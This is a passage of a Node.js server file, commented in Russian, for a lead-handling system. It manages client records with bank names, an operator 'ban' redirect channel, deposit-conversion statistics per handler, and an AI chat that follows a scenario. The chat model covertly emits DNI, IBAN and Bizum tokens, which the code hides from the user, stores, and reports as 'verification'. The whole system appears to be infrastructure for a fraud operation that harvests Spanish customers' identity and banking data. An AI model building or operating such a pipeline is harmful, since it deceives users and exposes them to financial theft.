      mine.screenshotUrl = url;
      mine.status = 'approved';
      mine.updatedAt = new Date().toISOString();
      await writeReviewTexts(texts);
    }
    // Дубль в карточку клиента — удобство для оператора, не источник правды.
    // Если БД недоступна, скриншот всё равно уже сохранён — клиента не тревожим.
    try {
      await mergeSubmissionData(flowSessionId, { reviewScreenshotUrl: url });
      broadcastUpdate('clients_changed');
    } catch (e) {
      console.error('[client/review-screenshot] submissionData:', e?.message);
    }
    return reply.send({ ok: true, url });
  } catch (err) {
    console.error('[client/review-screenshot]', err?.message || err);
    return reply.status(500).send({ error: 'save_failed' });
  }
}

// Клиент увидел предложение — больше не редиректим.
async function handleClientReviewSeen(req, reply) {
  try {
    const body = asRecord(req.body) ?? {};
    const flowSessionId = sanitizeString(getString(body.flowSessionId), 80);
    if (!flowSessionId) return reply.send({ ok: true });
    await mergeSubmissionData(flowSessionId, { reviewPromptSeen: new Date().toISOString() });
    return reply.send({ ok: true });
  } catch { return reply.send({ ok: true }); }
}

// GET /api/client/events?flowSessionId=... — SSE-канал клиента для мгновенного редиректа.
async function handleClientEvents(req, reply) {
  const flowSessionId = sanitizeString(String(req.query?.flowSessionId || ''), 80);
  if (!flowSessionId) return reply.status(400).send({ error: 'flowSessionId required' });
  reply.hijack();
  const raw = reply.raw;
  raw.writeHead(200, {
    'Content-Type': 'text/event-stream',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'X-Accel-Buffering': 'no',
    'Access-Control-Allow-Origin': '*',
  });
  // Сразу отдаём текущее состояние — если уже забанен, страница редиректнет мгновенно.
  const banned = await isClientBanned(flowSessionId);
  raw.write(`data: ${JSON.stringify({ type: banned ? 'ban' : 'connected', banned })}\n\n`);

  let set = clientSseBySession.get(flowSessionId);
  if (!set) { set = new Set(); clientSseBySession.set(flowSessionId, set); }
  set.add(raw);

  const ping = setInterval(() => {
    try { raw.write(':ping\n\n'); } catch { clearInterval(ping); }
  }, 20000);
  req.raw.on('close', () => {
    clearInterval(ping);
    const s = clientSseBySession.get(flowSessionId);
    if (s) { s.delete(raw); if (!s.size) clientSseBySession.delete(flowSessionId); }
  });
}

// POST /api/chat-op/ban — оператор переносит клиента в «ожидание» (или возвращает).
async function handleChatOpBan(req, reply) {
  if (!requireChatOp(req, reply)) return;
  try {
    const body = asRecord(req.body) ?? {};
    const sessionId = sanitizeString(getString(body.sessionId), 80);
    if (!sessionId) return reply.status(400).send({ error: 'sessionId required' });
    const banned = body.banned === false ? false : true; // по умолчанию — в ожидание
    try {
      await prisma.webClient.update({ where: { flowSessionId: sessionId }, data: { banned } });
    } catch (e) {
      if (e?.code === 'P2022') {
        return reply.status(500).send({ error: 'migration_required', message: 'Нужна миграция БД (колонка banned) + перезапуск.' });
      }
      if (e?.code === 'P2025') {
        return reply.status(404).send({ error: 'client_not_found' });
      }
      throw e;
    }
    // Мгновенный сигнал открытым вкладкам клиента.
    pushClientEvent(sessionId, { type: banned ? 'ban' : 'unban', banned });
    broadcastUpdate('clients_changed');
    return reply.send({ ok: true, banned });
  } catch (err) {
    console.error('[chat-op/ban]', err?.message || err);
    return reply.status(500).send({ error: 'server_error' });
  }
}

async function handleSSE(req, reply) {
  const token = sanitizeString(String(req.query.token || ''), 120);
  if (!token || !sessionValid(adminSessions, token)) {
    return reply.status(401).send({ error: 'Unauthorized' });
  }
  reply.hijack();
  const raw = reply.raw;
  raw.writeHead(200, {
    'Content-Type': 'text/event-stream',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'X-Accel-Buffering': 'no',
  });
  raw.write('data: {"type":"connected"}\n\n');
  sseClients.add(raw);
  const ping = setInterval(() => {
    try { raw.write(':ping\n\n'); } catch { clearInterval(ping); sseClients.delete(raw); }
  }, 20000);
  req.raw.on('close', () => { clearInterval(ping); sseClients.delete(raw); });
}

// ─── Full admin: clients list ─────────────────────────────────────────────────

async function handleAdminDeleteClient(req, reply) {
  if (!requireAdmin(req, reply)) return;
  try {
    const id = sanitizeString(req.params.id || '', 40);
    if (!id) return reply.status(400).send({ error: 'missing_id' });
    await prisma.$transaction([
      prisma.webEvent.deleteMany({ where: { clientId: id } }),
      prisma.callLog.deleteMany({ where: { clientId: id } }),
      prisma.webClient.delete({ where: { id } }),
    ]);
    broadcastUpdate('clients_changed');
    return reply.send({ ok: true });
  } catch (err) {
    console.error('[admin-delete-client] error:', err?.message || err);
    return reply.status(500).send({ error: 'server_error' });
  }
}

async function handleAdminClients(req, reply) {
  if (!requireAdmin(req, reply)) return;
  try {
    const page = Math.max(1, parseInt(req.query.page || '1', 10));
    const limit = Math.min(50, Math.max(1, parseInt(req.query.limit || '10', 10) || 10));
    const skip = (page - 1) * limit;
    const q = (req.query.q || '').trim();
    const status = (req.query.status || '').trim();
    const funnelFilter = FUNNEL_RANK.has(status) ? status : null;

    // Фильтр по статусу воронки — производный, поэтому считаем и пагинируем в памяти.
    if (funnelFilter) {
      const ql = q.toLowerCase();
      const qMatch = (c) => !q
        || `${c.nombre || ''} ${c.email || ''} ${c.bank || ''}`.toLowerCase().includes(ql);
      const all = await prisma.webClient.findMany({
        orderBy: { updatedAt: 'desc' },
        include: { events: { orderBy: { createdAt: 'asc' } } },
      });
      const fmap = await computeFunnelMap(all);
      const matched = all.filter((c) => qMatch(c) && fmap.get(c.flowSessionId) === funnelFilter);
      const total = matched.length;
      const pageRows = matched
        .slice(skip, skip + limit)
        .map((c) => ({ ...c, funnelStatus: funnelFilter }));
      return reply.send({ clients: pageRows, total, page, pages: Math.ceil(total / limit) });
    }

    // Обычный путь: без фильтра или по «сырому» статусу (совместимость со старыми данными).
    const where = {};
    if (status) {
      where.status = status;
    }
    if (q) {
      const searchCondition = {
        OR: [
          { nombre: { contains: q, mode: 'insensitive' } },
          { email: { contains: q, mode: 'insensitive' } },
          { bank: { contains: q, mode: 'insensitive' } },
        ],
      };
      if (status) {
        where.AND = [{ status }, searchCondition];
      } else {
        where.OR = searchCondition.OR;
      }
    }

    const [clients, total] = await Promise.all([
      prisma.webClient.findMany({
        where,
        orderBy: { updatedAt: 'desc' },
        skip, take: limit,
        include: { events: { orderBy: { createdAt: 'asc' } } },
      }),
      prisma.webClient.count({ where }),
    ]);
    const fmap = await computeFunnelMap(clients);
    const withFunnel = clients.map((c) => ({ ...c, funnelStatus: fmap.get(c.flowSessionId) }));
    return reply.send({ clients: withFunnel, total, page, pages: Math.ceil(total / limit) });
  } catch (err) {
    console.error('[admin-clients] error:', err?.message || err);
    return reply.status(500).send({ error: 'server_error' });
  }
}

async function handleAdminClientChat(req, reply) {
  if (!requireAdmin(req, reply)) return;
  try {
    const flowSessionId = sanitizeString(req.params.sessionId || '', 80);
    // Первый чат (assistant.html) — ключ web:, второй чат (chat.html) — ключ chat:
    const [assistantLead, supportLead] = await Promise.all([
      prisma.lead.findUnique({ where: { tgId: `web:${flowSessionId}` } }),
      prisma.lead.findUnique({ where: { tgId: `chat:${flowSessionId}` } }),
    ]);
    async function leadMessages(lead) {
      if (!lead) return [];
      return prisma.message.findMany({
        where: { leadId: lead.id },
        orderBy: { createdAt: 'asc' },
        select: { role: true, content: true, createdAt: true },
      });
    }
    const [messages, supportMessages] = await Promise.all([
      leadMessages(assistantLead),
      leadMessages(supportLead),
    ]);
    // messages — первый чат (для обратной совместимости), supportMessages — второй
    return reply.send({ messages, supportMessages });
  } catch (err) {
    console.error('[admin-client-chat] error:', err?.message || err);
    return reply.status(500).send({ error: 'server_error' });
  }
}

async function handleAdminClientStatuses(req, reply) {
  if (!requireAdmin(req, reply)) return;
  try {
    // Статусы воронки (как в «Статистике») + их количество. Производные значения.
    const clients = await prisma.webClient.findMany({
      select: {
        flowSessionId: true,
        captchaPassed: true,
        operatorStatus: true,
      },
    });
    const fmap = await computeFunnelMap(clients);
    const counts = new Map(FUNNEL_STATUSES.map((s) => [s, 0]));
    for (const c of clients) {
      const fs = fmap.get(c.flowSessionId);
      if (fs) counts.set(fs, counts.get(fs) + 1);
    }
    const statuses = FUNNEL_STATUSES.map((status) => ({ status, count: counts.get(status) }));
    return reply.send({ statuses });
  } catch (err) {
    console.error('[admin-client-statuses] error:', err?.message || err);
    return reply.status(500).send({ error: 'server_error' });
  }
}

// ═══ Handler Performance (обработчики/менеджеры) ══════════════════════════════
// Когорты по календарной дате назначения лида (assignedAt). Легко расширяется.
const COHORT_WINDOWS = [3, 5, 7, 10, 15, 30];

// ── Реестр обработчиков (админ CRUD) ──────────────────────────────────────────
async function handleGetHandlers(req, reply) {
  if (!requireAdmin(req, reply)) return;
  try {
    const handlers = await prisma.handler.findMany({ orderBy: { createdAt: 'asc' } });
    return reply.send({ handlers: handlers.map(({ password, ...h }) => h) });
  } catch (err) {
    console.error('[admin-handlers/get]', err?.message || err);
    return reply.status(500).send({ error: 'server_error' });
  }
}

async function handleCreateHandler(req, reply) {
  if (!requireAdmin(req, reply)) return;
  try {
    const body = asRecord(req.body) ?? {};
    const name = sanitizeString(getString(body.name), 80);
    const login = sanitizeString(getString(body.login), 60);
    const password = sanitizeString(getString(body.password), 100);
    if (!name || !login || !password) return reply.status(400).send({ error: 'name, login, password required' });
    const created = await prisma.handler.create({ data: { name, login, password, active: true } });
    const { password: _p, ...safe } = created;
    return reply.send({ handler: safe });
  } catch (err) {
    if (err?.code === 'P2002') return reply.status(409).send({ error: 'login_taken' });
    console.error('[admin-handlers/create]', err?.message || err);
    return reply.status(500).send({ error: 'server_error' });
  }
}

async function handleUpdateHandler(req, reply) {
  if (!requireAdmin(req, reply)) return;
  try {
    const id = sanitizeString(req.params.id || '', 40);
    const body = asRecord(req.body) ?? {};
    const data = {};
    if (typeof body.name === 'string') data.name = sanitizeString(body.name, 80);
    if (typeof body.login === 'string') data.login = sanitizeString(body.login, 60);
    if (typeof body.password === 'string' && body.password) data.password = sanitizeString(body.password, 100);
    if (typeof body.active === 'boolean') data.active = body.active;
    const updated = await prisma.handler.update({ where: { id }, data });
    const { password: _p, ...safe } = updated;
    return reply.send({ handler: safe });
  } catch (err) {
    if (err?.code === 'P2002') return reply.status(409).send({ error: 'login_taken' });
    console.error('[admin-handlers/update]', err?.message || err);
    return reply.status(500).send({ error: 'server_error' });
  }
}

async function handleDeleteHandler(req, reply) {
  if (!requireAdmin(req, reply)) return;
  try {
    const id = sanitizeString(req.params.id || '', 40);
    // Отвязываем лиды (SET NULL уже в FK, но снимаем и routing если указывал на него)
    const settings = await readSettings();
    if (settings.routingHandlerId === id) {
      settings.routingHandlerId = null;
      await writeSettings(settings);
    }
    await prisma.handler.delete({ where: { id } });
    return reply.send({ ok: true });
  } catch (err) {
    console.error('[admin-handlers/delete]', err?.message || err);
    return reply.status(500).send({ error: 'server_error' });
  }
}

// ── Роутинг новых лидов ───────────────────────────────────────────────────────
async function handleGetRoutingHandler(req, reply) {
  if (!requireAdmin(req, reply)) return;
  const s = await readSettings();
  return reply.send({ routingHandlerId: s.routingHandlerId ?? null });
}

async function handleUpdateRoutingHandler(req, reply) {
  if (!requireAdmin(req, reply)) return;
  try {
    const body = asRecord(req.body) ?? {};
    const s = await readSettings();
    if ('routingHandlerId' in body) {
      const hid = body.routingHandlerId ? sanitizeString(getString(body.routingHandlerId), 40) : null;
      s.routingHandlerId = hid || null;
    }
    await writeSettings(s);
    return reply.send({ routingHandlerId: s.routingHandlerId ?? null });
  } catch (err) {
    console.error('[admin-routing/update]', err?.message || err);
    return reply.status(500).send({ error: 'server_error' });
  }
}

// ── История привязок лида к обработчикам ──────────────────────────────────────
// WebClient.handlerId — «кто ведёт сейчас». ClientAssignment — интервалы «кто вёл
// и когда»: открытый интервал (endedAt = null) принадлежит текущему обработчику.
// Депозит засчитывается тому, в чей интервал попал его confirmedAt, поэтому после
// передачи лида прошлые платежи остаются у прежнего обработчика.
async function openAssignmentInterval(clientId, handlerId, startedAt) {
  if (!clientId || !handlerId) return;
  try {
    await prisma.clientAssignment.create({
      data: { clientId, handlerId, startedAt: startedAt || new Date() },
    });
  } catch (e) {
    console.error('[assignment/open]', e?.message || e);
  }
}

// Закрывает открытые интервалы клиента и открывает новый под нового обработчика.
// Вызывать только когда handlerId реально изменился.
async function switchAssignment(clientId, nextHandlerId, at = new Date()) {
  try {
    await prisma.clientAssignment.updateMany({
      where: { clientId, endedAt: null },
      data: { endedAt: at },
    });
  } catch (e) {
    console.error('[assignment/close]', e?.message || e);
  }
  if (nextHandlerId) await openAssignmentInterval(clientId, nextHandlerId, at);
}

// ── Ручное (пере)назначение конкретного лида обработчику ───────────────────────
async function handleAssignClientHandler(req, reply) {
  if (!requireAdmin(req, reply)) return;
  try {
    const id = sanitizeString(req.params.id || '', 40);
    const body = asRecord(req.body) ?? {};
    const handlerId = body.handlerId ? sanitizeString(getString(body.handlerId), 40) : null;
    const before = await prisma.webClient.findUnique({
      where: { id },
      select: { handlerId: true, assignedAt: true },
    });
    await prisma.webClient.update({ where: { id }, data: { handlerId } });
    // Когорта стартует на Start (assignedAt). Пока его нет — интервал не открываем,
    // он появится вместе с assignedAt. Если когорта уже идёт и обработчик сменился —
    // закрываем прошлый интервал и открываем новый с текущего момента: депозиты до
    // переключения остаются у прежнего обработчика, после — у нового.
    if (before?.assignedAt && before.handlerId !== handlerId) {
      await switchAssignment(id, handlerId);
    }
    broadcastUpdate('clients_changed');
    return reply.send({ ok: true, handlerId });
  } catch (err) {
    console.error('[admin-assign-handler]', err?.message || err);
    return reply.status(500).send({ error: 'server_error' });
  }
}

// ── Когортная статистика эффективности обработчиков ───────────────────────────
// Начало календарных суток по локальному времени сервера.
function startOfLocalDay(d) {
  return new Date(d.getFullYear(), d.getMonth(), d.getDate(), 0, 0, 0, 0);
}
function addDays(d, n) {
  return new Date(d.getFullYear(), d.getMonth(), d.getDate() + n, 0, 0, 0, 0);
}
function localDateKey(d) {
  const m = String(d.getMonth() + 1).padStart(2, '0');
  const day = String(d.getDate()).padStart(2, '0');
  return `${d.getFullYear()}-${m}-${day}`;
}

// ── Ручные правки статистики обработчиков (ФД/РД/РД2/РД3 + комментарий) ────────
// Ключ: `${handlerId}|${dateKey}` (dateKey = YYYY-MM-DD когорты). Храним только
// поправки к авто-счёту: fdDelta/rdDelta/rd2Delta/rd3Delta и comment.
const HANDLER_NOTES_FILE = join(process.cwd(), 'data', 'handler-notes.json');
async function readHandlerNotes() {
  try {
    const parsed = JSON.parse(await readFile(HANDLER_NOTES_FILE, 'utf8'));
    return (parsed && typeof parsed === 'object' && !Array.isArray(parsed)) ? parsed : {};
  } catch { return {}; }
}
async function writeHandlerNotes(data) {
  try { await mkdir(join(process.cwd(), 'data'), { recursive: true }); await writeFile(HANDLER_NOTES_FILE, JSON.stringify(data, null, 2), 'utf8'); }
  catch (e) { console.error('[handler-notes] write error:', e?.message); }
}

// Правка ячейки статистики: заданное число сохраняется как дельта к текущему
// авто-подсчёту, чтобы новые реальные оплаты продолжали прибавляться сверху.
// null/'' — сбрасывают к авто. Комментарий — свободный текст админа.
async function handleUpdateHandlerNote(req, reply) {
  if (!requireAdmin(req, reply)) return;
  try {
    const body = asRecord(req.body) ?? {};
    const handlerId = sanitizeString(getString(body.handlerId), 40);
    const date = sanitizeString(getString(body.date), 10);
    if (!handlerId || !/^\d{4}-\d{2}-\d{2}$/.test(date)) {
      return reply.status(400).send({ error: 'handlerId and valid date required' });
    }
    const key = `${handlerId}|${date}`;
    const all = await readHandlerNotes();
    const rec = { ...(all[key] || {}) };
    for (const kind of ['fd', 'rd', 'rd2', 'rd3']) {
      const countField = `${kind}Count`;
      const amountField = `${kind}Amount`;
      const autoField = `${kind}AutoCount`;
      const deltaField = `${kind}Delta`;
      if (countField in body) {
        const v = body[countField];
        if (v === null || v === '') {
          delete rec[countField];
          delete rec[amountField];
          delete rec[deltaField];
          continue;
        }
        const n = Number(v);
        if (Number.isFinite(n) && n >= 0) {
          const count = Math.round(n);
          const autoCount = Number(body[autoField]);
          const delta = count - (Number.isFinite(autoCount) && autoCount >= 0 ? Math.round(autoCount) : 0);
          delete rec[countField];
          delete rec[amountField];
          if (delta) rec[deltaField] = delta;
          else delete rec[deltaField];
        }
      } else if (amountField in body) {
        const v = body[amountField];
        if (v === null || v === '') { delete rec[amountField]; continue; }
        const n = Number(v);
        if (Number.isFinite(n) && n >= 0) rec[amountField] = Math.round(n * 100) / 100;
      }
    }
    if ('comment' in body) {
      const c = sanitizeString(getString(body.comment), 500);
      if (c) rec.comment = c; else delete rec.comment;
    }

    if (Object.keys(rec).length) all[key] = rec; else delete all[key];
    await writeHandlerNotes(all);
    return reply.send({ ok: true, note: all[key] || {} });
  } catch (err) {
    console.error('[handler-note/update]', err?.message || err);
    return reply.status(500).send({ error: 'server_error' });
  }
}

async function handleHandlerPerformance(req, reply) {
  if (!requireAdmin(req, reply)) return;
  try {
    const q = req.query || {};
    const fromDate = q.from ? new Date(`${String(q.from)}T00:00:00`) : null;
    const toDate = q.to ? new Date(`${String(q.to)}T23:59:59.999`) : null;
    const handlerFilter = q.handlerId ? sanitizeString(String(q.handlerId), 40) : null;

    // Запрос 1 — интервалы владения лидами, а НЕ текущий handlerId клиента.
    // Иначе переназначение задним числом утаскивало бы всю историю депозитов в
    // когорту нового обработчика, а прежний терял бы свои цифры за прошлые дни.
    // Дата когорты = startedAt интервала: забрал лид 8-го — попал в когорту 8-го.
    const startedWhere = {};
    if (fromDate && !isNaN(fromDate.getTime())) startedWhere.gte = fromDate;
    if (toDate && !isNaN(toDate.getTime())) startedWhere.lte = toDate;

    const where = {};
    if (Object.keys(startedWhere).length) where.startedAt = startedWhere;
    if (handlerFilter) where.handlerId = handlerFilter;

    const assignments = await prisma.clientAssignment.findMany({
      where,
      select: { clientId: true, handlerId: true, startedAt: true, endedAt: true },
    });

    // Список обработчиков (для имён и селектора).
    const handlers = await prisma.handler.findMany({ select: { id: true, name: true } });
    const handlerName = new Map(handlers.map((h) => [h.id, h.name]));

    // Запрос 2 — все депозиты этих клиентов (bulk, без per-row).
    const clientIds = [...new Set(assignments.map((a) => a.clientId))];

    // Самый ранний интервал каждого клиента считаем открытым влево: депозит,
    // подтверждённый до нажатия Start, раньше попадал в когорту, и он должен
    // остаться у первого обработчика, а не пропасть. Границу берём из БД, а не
    // из выборки выше — она урезана фильтрами по дате и обработчику.
    const firstSpans = clientIds.length
      ? await prisma.clientAssignment.groupBy({
          by: ['clientId'],
          where: { clientId: { in: clientIds } },
          _min: { startedAt: true },
        })
      : [];
    const firstStartMs = new Map(
      firstSpans.map((g) => [g.clientId, new Date(g._min.startedAt).getTime()]),
    );
    const deposits = clientIds.length
      ? await prisma.deposit.findMany({
          where: { clientId: { in: clientIds } },
          select: { clientId: true, amount: true, confirmedAt: true, type: true },
        })
      : [];
    const depositsByClient = new Map();
    for (const d of deposits) {
      const arr = depositsByClient.get(d.clientId) || [];
      arr.push(d);
      depositsByClient.set(d.clientId, arr);
    }

    // Ручные поправки ФД/РД/РД2/РД3 и комментарии админа.
    const notes = await readHandlerNotes();
    const settings = await readSettings();
    const depositRates = {
      fd: Number(settings.depositFD ?? 100),
      rd: Number(settings.depositRD ?? 190),
      rd2: depositRD2Amount(settings),
      rd3: depositRD3Amount(settings),
    };
    function cohortPaymentMetric(kind, autoCount, autoAmount, ov) {
      const deltaField = `${kind}Delta`;
      const legacyCountField = `${kind}Count`;
      const legacyAmountField = `${kind}Amount`;
      if (ov[deltaField] == null && (ov[legacyCountField] != null || ov[legacyAmountField] != null)) {
        if (ov[legacyCountField] != null) {
          const legacyCount = Math.max(0, Math.round(Number(ov[legacyCountField]) || 0));
          const migratedDelta = legacyCount - autoCount;
          if (migratedDelta) ov[deltaField] = migratedDelta;
        }
        delete ov[legacyCountField];
        delete ov[legacyAmountField];
        notesDirty = true;
      }
      const delta = Number(ov[deltaField] ?? 0);
      const hasDelta = Number.isFinite(delta) && delta !== 0;
      if (hasDelta) {
        const rate = Number.isFinite(depositRates[kind]) ? depositRates[kind] : 0;
        const count = Math.max(0, autoCount + delta);
        return {
          count,
          amount: Math.round(count * rate * 100) / 100,
          edited: true,
          delta,
        };
      }
      return {
        count: autoCount,
        amount: Math.round(autoAmount * 100) / 100,
        edited: false,
        delta: 0,
      };
    }
    let notesDirty = false;

    // Группируем интервалы по (handlerId, календарная дата startedAt).
    // Каждый интервал несёт своё окно владения — по нему отсекаются депозиты.
    const cohorts = new Map(); // key -> { handlerId, dateKey, cohortStart, spans:[{clientId,fromMs,toMs}] }
    for (const a of assignments) {
      const cohortStart = startOfLocalDay(new Date(a.startedAt));
      const dateKey = localDateKey(cohortStart);
      const key = `${a.handlerId}|${dateKey}`;
      let c = cohorts.get(key);
      if (!c) { c = { handlerId: a.handlerId, dateKey, cohortStart, spans: [] }; cohorts.set(key, c); }
      const startMs = new Date(a.startedAt).getTime();
      c.spans.push({
        clientId: a.clientId,
        // Первый интервал клиента открыт влево — см. firstStartMs выше.
        fromMs: firstStartMs.get(a.clientId) === startMs ? -Infinity : startMs,
        toMs: a.endedAt ? new Date(a.endedAt).getTime() : Infinity, // открытый интервал
      });
    }

    // Депозит принадлежит интервалу, если confirmedAt попал в [fromMs, toMs).
    const inSpan = (span, d) => {
      const t = new Date(d.confirmedAt).getTime();
      return t >= span.fromMs && t < span.toMs;
    };

    const now = Date.now();
    const rows = [];
    for (const c of cohorts.values()) {
      // Лид считается один раз, даже если за день его забирали и возвращали.
      const leadCount = new Set(c.spans.map((s) => s.clientId)).size;
      // ФД/РД/РД2/РД3 по когорте: подтверждённые депозиты клиентов.
      // Суммируем все подтверждённые (не по D-окнам) — это фактический сбор когорты.
      let fdC = 0, fdA = 0, rdC = 0, rdA = 0, rd2C = 0, rd2A = 0, rd3C = 0, rd3A = 0;
      for (const span of c.spans) {
        const ds = depositsByClient.get(span.clientId);
        if (!ds) continue;
        for (const d of ds) {
          if (!inSpan(span, d)) continue;
          if (d.type === 'RD3') { rd3C += 1; rd3A += d.amount; }
          else if (d.type === 'RD2') { rd2C += 1; rd2A += d.amount; }
          else if (d.type === 'RD') { rdC += 1; rdA += d.amount; }
          else if (d.type === 'FD') { fdC += 1; fdA += d.amount; }
        }
      }
      const ov = notes[`${c.handlerId}|${c.dateKey}`] || {};
      const fdMetric = cohortPaymentMetric('fd', fdC, fdA, ov);
      const rdMetric = cohortPaymentMetric('rd', rdC, rdA, ov);
      const rd2Metric = cohortPaymentMetric('rd2', rd2C, rd2A, ov);
      const rd3Metric = cohortPaymentMetric('rd3', rd3C, rd3A, ov);
      const paymentDeltaCount = (fdMetric.count - fdC) + (rdMetric.count - rdC)
        + (rd2Metric.count - rd2C) + (rd3Metric.count - rd3C);
      const payerDeltaCount = fdMetric.count - fdC;
      const paymentDeltaAmount = (fdMetric.amount - Math.round(fdA * 100) / 100)
        + (rdMetric.amount - Math.round(rdA * 100) / 100)
        + (rd2Metric.amount - Math.round(rd2A * 100) / 100)
        + (rd3Metric.amount - Math.round(rd3A * 100) / 100);
      const windows = {};
      for (const n of COHORT_WINDOWS) {
        const windowEnd = addDays(c.cohortStart, n);
        const label = `D${n}`;
        if (now < windowEnd.getTime()) {
          // Окно не завершено — не считаем (в UI будет таймер).
          windows[label] = { pending: true };
          continue;
        }
        const startMs = c.cohortStart.getTime();
        const endMs = windowEnd.getTime();
        let sumAmount = 0;
        let depositCount = 0;
        const payers = new Set();
        for (const span of c.spans) {
          const ds = depositsByClient.get(span.clientId);
          if (!ds) continue;
          for (const d of ds) {
            if (!inSpan(span, d)) continue; // чужой период владения лидом
            const t = new Date(d.confirmedAt).getTime();
            if (t >= startMs && t < endMs) {
              sumAmount += d.amount;
              depositCount += 1;
              payers.add(span.clientId);
            }
          }
        }
        const adjustedDepositCount = Math.max(0, depositCount + paymentDeltaCount);
        const adjustedSumAmount = Math.max(0, sumAmount + paymentDeltaAmount);
        const adjustedPayerCount = Math.max(0, Math.min(leadCount, payers.size + payerDeltaCount));
        windows[label] = {
          pending: false,
          pcr: leadCount ? (adjustedPayerCount / leadCount) * 100 : 0,
          rpl: leadCount ? adjustedSumAmount / leadCount : 0,
          ac: adjustedDepositCount ? adjustedSumAmount / adjustedDepositCount : 0,
        };
      }
      rows.push({
        date: c.dateKey,
        handlerId: c.handlerId,
        handlerName: handlerName.get(c.handlerId) || '—',
        leads: leadCount,
        // Авто-подсчёт нужен фронту для сброса ручной правки.
        fdAuto: { count: fdC, amount: Math.round(fdA * 100) / 100 },
        rdAuto: { count: rdC, amount: Math.round(rdA * 100) / 100 },
        rd2Auto: { count: rd2C, amount: Math.round(rd2A * 100) / 100 },
        rd3Auto: { count: rd3C, amount: Math.round(rd3A * 100) / 100 },
        fd: fdMetric,
        rd: rdMetric,
        rd2: rd2Metric,
        rd3: rd3Metric,
        comment: ov.comment || '',
        windows,
      });
    }

    // Сортировка: сначала свежие даты, потом имя обработчика.
    rows.sort((a, b) => (a.date < b.date ? 1 : a.date > b.date ? -1 : a.handlerName.localeCompare(b.handlerName)));
    if (notesDirty) await writeHandlerNotes(notes);

    return reply.send({
      rows,
      cohorts: COHORT_WINDOWS.map((n) => `D${n}`),
      handlers: handlers.map((h) => ({ id: h.id, name: h.name })),
    });
  } catch (err) {
    console.error('[admin-handler-performance]', err?.message || err);
    return reply.status(500).send({ error: 'server_error' });
  }
}

// ─── AI web chat (assistant.html) ─────────────────────────────────────────────
// Один лид на веб-сессию (ключ web:<flowSessionId>); память — сообщения этого лида.

function leadKeyFromSession(sessionId) {
  return `web:${sessionId}`;
}

function historyToLlm(systemPrompt, history) {
  const msgs = [{ role: 'system', content: systemPrompt }];
  for (const m of history) {
    if (m.role === 'USER') msgs.push({ role: 'user', content: m.content });
    else if (m.role === 'ASSISTANT') msgs.push({ role: 'assistant', content: m.content });
  }
  return msgs;
}

async function handleChat(req, reply) {
  try {
    const body = asRecord(req.body) ?? {};
    const sessionId = sanitizeString(getString(body.sessionId), 80);
    if (!sessionId) return reply.status(400).send({ error: 'sessionId required' });

    const message = sanitizeString(getString(body.message), 4000);
    const start = body.start === true;
    const name = sanitizeString(getString(body.name), 120);
    const bank = sanitizeString(getString(body.bank), 120);

    if (!start && !message) return reply.status(400).send({ error: 'message required' });

    const key = leadKeyFromSession(sessionId);
    const lead = await prisma.lead.upsert({
      where: { tgId: key },
      create: { tgId: key, chatId: key, firstName: name || null },
      update: name ? { firstName: name } : {},
    });

    const cfg = await getBotConfig();
    if (!cfg.aiEnabled || !lead.aiEnabled) {
      return reply.send({ reply: '', disabled: true });
    }

    // Сохраняем входящее сообщение клиента (для start-триггера сообщения нет).
    if (message) {
      await prisma.message.create({ data: { leadId: lead.id, role: 'USER', content: message } });
    }

    // Защита от ботов: ИИ отвечает только тем, кто прошёл капчу (как во втором чате,
    // handleSupportChat). Входящее сообщение уже сохранено выше для аудита — просто молчим.
    if (!(await hasCaptchaPassed(sessionId))) {
      return reply.send({ reply: '' });
    }

    const history = await prisma.message.findMany({
      where: { leadId: lead.id },
      orderBy: { createdAt: 'asc' },
      take: cfg.historyLimit,
    });

    // start: если приветствие уже было — не генерируем заново, отдаём последнее.
    if (start && message === '') {
      const lastAssistant = [...history].reverse().find((m) => m.role === 'ASSISTANT');
      if (lastAssistant) return reply.send({ reply: lastAssistant.content });
    }

    const system = buildSystemPrompt(cfg.systemPrompt, { name, bank });
    const llmMessages = historyToLlm(system, history);
    if (start && history.length === 0) {
      llmMessages.push({ role: 'user', content: '[Пользователь только что открыл чат. Поприветствуй его и начни сценарий.]' });
    }

    const rawReply = await aiChat(llmMessages, {
      provider: cfg.provider,
      model: cfg.model,
      temperature: cfg.temperature,
      maxTokens: cfg.maxTokens,
      tgRequestLogging: cfg.tgRequestLogging,
      trace: { source: 'assistant.html (/api/chat)', sessionId, leadId: lead.id, clientName: name },
    });

    // Extract hidden tokens before stripping them from the user-visible text.
    const dniMatch = rawReply.match(/\[\[DNI:\s*([A-Z0-9][A-Z0-9 \-]{3,24})\]\]/i);
    const extractedDni = dniMatch ? dniMatch[1].replace(/[\s\-]/g, '').toUpperCase() : null;
    // In the first chat, [[BIZUM:...]] is the phone linked to Bizum.
    // The support chat below separately keeps PHONE as the ordinary contact phone.
    const isDone = rawReply.includes('[[FIN]]');
    const tokenPaymentDetails = extractChatPaymentDetails(rawReply);
    const paymentDetails = tokenPaymentDetails.paymentMethod
      ? tokenPaymentDetails
      : (isDone ? extractUserPaymentDetails(message) : tokenPaymentDetails);
    const extractedIban = paymentDetails.iban;
    const extractedBizum = paymentDetails.bizum;

    const replyText = rawReply
      .replace(/\[\[DNI:[^\]]*\]\]/gi, '')
      .replace(/\[\[IBAN:[^\]]*\]\]/gi, '')
      .replace(/\[\[BIZUM:[^\]]*\]\]/gi, '')
      .replace(/\[\[FIN\]\]/g, '')
      .trim();

    await prisma.message.create({ data: { leadId: lead.id, role: 'ASSISTANT', content: replyText } });

    // Save extracted tokens immediately. IBAN and Bizum are mutually exclusive.
    if (extractedDni || paymentDetails.paymentMethod) {
      try {
        const existingClient = await prisma.webClient.findUnique({
          where: { flowSessionId: sessionId },
          select: { submissionData: true },
        });
        const existingSub = (existingClient?.submissionData && typeof existingClient.submissionData === 'object')
          ? existingClient.submissionData : {};
        const newSub = applyChatPaymentDetails(existingSub, paymentDetails);
        if (extractedDni) newSub.dni = extractedDni;
        await upsertWebClient(sessionId, { submissionData: newSub });
        if (isDone) {
          const selectedPayment = getClientPaymentDetails(newSub);
          const tgLines = [
            '*🆔 КЛИЕНТ ПРОШЁЛ ВЕРИФИКАЦИЮ В ЧАТЕ*',
            `Session: \`${sessionId}\``,
            extractedDni   ? `DNI: \`${extractedDni}\`` : '',
            selectedPayment.iban ? `IBAN: \`${selectedPayment.iban}\`` : '',
            selectedPayment.bizum ? `Bizum: \`${selectedPayment.bizum}\`` : '',
          ].filter(Boolean);
